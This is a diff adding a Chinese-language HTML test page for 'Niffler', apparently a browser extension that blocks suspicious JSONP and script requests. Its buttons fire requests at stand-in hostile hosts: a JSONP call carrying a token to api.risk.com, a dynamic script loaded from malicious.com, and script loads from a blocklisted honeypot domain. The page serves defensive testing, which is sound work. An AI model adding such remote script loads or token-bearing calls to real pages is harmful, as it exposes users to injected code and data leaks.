@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <title>Niffler 插件测试页面</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 20px;
+        }
+        .test-section {
+            border: 1px solid #ccc;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 5px;
+        }
+        button {
+            padding: 8px 15px;
+            margin: 5px;
+            background: #007bff;
+            color: white;
+            border: none;
+            border-radius: 3px;
+            cursor: pointer;
+        }
+        button:hover {
+            background: #0056b3;
+        }
+        #results {
+            margin-top: 20px;
+            padding: 10px;
+            background: #f8f9fa;
+            border-radius: 5px;
+        }
+        .request-item {
+            margin: 5px 0;
+            padding: 5px;
+            border-left: 3px solid transparent;
+        }
+        .blocked {
+            border-color: #dc3545;
+            color: #dc3545;
+        }
+        .allowed {
+            border-color: #28a745;
+            color: #28a745;
+        }
+    </style>
+</head>
+<body>
+    <h1>Niffler 插件测试页面</h1>
+    
+    <div class="test-section">
+        <h2>测试用例</h2>
+        
+        <div>
+            <button onclick="testSafeRequest()">发送安全请求</button>
+            <button onclick="testJsonpRequest()">发送JSONP请求</button>
+            <button onclick="testBlockedDomain()">发送黑名单域名请求</button>
+            <button onclick="testDynamicScript()">动态加载脚本</button>
+            <button onclick="clearResults()">清除结果</button>
+        </div>
+
+        <h3>检测结果：</h3>
+        <div id="results"></div>
+    </div>
+
+    <script>
+        // 测试结果记录
+        let testCount = 0;
+
+        // 安全请求（应该放行）
+        function testSafeRequest() {
+            sendRequest('https://api.example.com/data', '合法请求');
+        }
+
+        // 可疑JSONP请求（应该拦截）
+        function testJsonpRequest() {
+            sendRequest('https://api.risk.com/jsonp?callback=malicious&token=123', '危险JSONP请求');
+        }
+
+        // 黑名单域名请求（应该拦截）
+        function testBlockedDomain() {
+            sendRequest('https://tracking.honeypot.com/analytics.js', '黑名单域名请求');
+        }
+
+        // 动态脚本加载测试
+        function testDynamicScript() {
+            const script = document.createElement('script');
+            script.src = 'https://malicious.com/dynamic.js?cb=evil';
+            document.head.appendChild(script);
+            logResult('动态脚本加载', '危险动态请求');
+        }
+
+        // 发送请求并记录结果
+        function sendRequest(url, description) {
+            fetch(url)
+                .then(() => logResult(url, description, false))
+                .catch(e => logResult(url, description, true));
+        }
+
+        // 记录测试结果
+        function logResult(url, description, isBlocked) {
+            const resultDiv = document.createElement('div');
+            resultDiv.className = `request-item ${isBlocked ? 'blocked' : 'allowed'}`;
+            resultDiv.innerHTML = `
+                <strong>测试#${++testCount}:</strong> 
+                ${description}<br>
+                <small>${url}</small><br>
+                状态：${isBlocked ? '❌ 已拦截' : '✅ 已放行'}
+            `;
+            document.getElementById('results').appendChild(resultDiv);
+        }
+
+        // 清除测试结果
+        function clearResults() {
+            document.getElementById('results').innerHTML = '';
+            testCount = 0;
+        }
+    </script>
+
+    <!-- 用于测试的静态危险脚本 -->
+    <script src="https://tracking.honeypot.com/static.js?jsonp=callback"></script>
+</body>
+</html>
